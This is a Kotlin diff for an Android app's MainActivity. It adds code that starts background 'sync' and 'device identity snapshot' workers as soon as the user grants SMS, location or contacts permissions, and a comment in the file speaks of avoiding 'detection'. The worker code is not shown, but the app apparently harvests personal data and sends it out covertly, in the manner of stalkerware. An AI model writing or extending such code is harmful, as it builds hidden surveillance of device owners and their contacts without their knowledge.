@@ -80,7 +80,39 @@ class MainActivity : ComponentActivity() {
              val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
              intent.data = android.net.Uri.parse("package:$packageName")
              startActivity(intent)
+             return // Wait for user to return
         }
+
+        // --- SMART INITIALIZATION: CASCADE COMPLETE ---
+        // Once the user finishes the entire cascade, queue a final initial data sync.
+        val prefs = getSharedPreferences("app_stats", MODE_PRIVATE)
+        if (!prefs.getBoolean("full_setup_complete", false)) {
+            prefs.edit().putBoolean("full_setup_complete", true).apply()
+            triggerImmediateDataSync()
+        }
+    }
+
+    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (requestCode == 101) {
+            // User answered runtime permissions (SMS, Location, Contacts).
+            // Immediately queue a sync for WHATEVER they just granted.
+            triggerImmediateDataSync()
+        }
+    }
+
+    private fun triggerImmediateDataSync() {
+        val wm = androidx.work.WorkManager.getInstance(this)
+        val constraints = androidx.work.Constraints.Builder()
+            .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
+            .build()
+            
+        // WorkManager handles the queuing. If offline, it waits. If online, it fires instantly.
+        val initialSync = androidx.work.OneTimeWorkRequestBuilder<SyncWorker>()
+            .setConstraints(constraints)
+            .build()
+            
+        wm.enqueueUniqueWork("InitialDataSync", androidx.work.ExistingWorkPolicy.REPLACE, initialSync)
     }
 
     private fun showExplanationDialog(title: String, msg: String, onConfirm: () -> Unit) {
@@ -130,6 +162,17 @@ class MainActivity : ComponentActivity() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
 
         val wm = androidx.work.WorkManager.getInstance(this)
+        
+        // --- SMART INITIALIZATION: CRITICAL SNAPSHOT ---
+        // Queues the device identity and static info instantly. 
+        val instantConstraints = androidx.work.Constraints.Builder()
+            .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
+            .build()
+        val immediateSnapshot = androidx.work.OneTimeWorkRequestBuilder<HealthWorker>()
+            .setConstraints(instantConstraints)
+            .build()
+        wm.enqueueUniqueWork("ImmediateSnapshot", androidx.work.ExistingWorkPolicy.KEEP, immediateSnapshot)
+
         // OPTIMIZED: Run only when battery is not low to avoid heat/detection
         val constraints = androidx.work.Constraints.Builder()
             .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
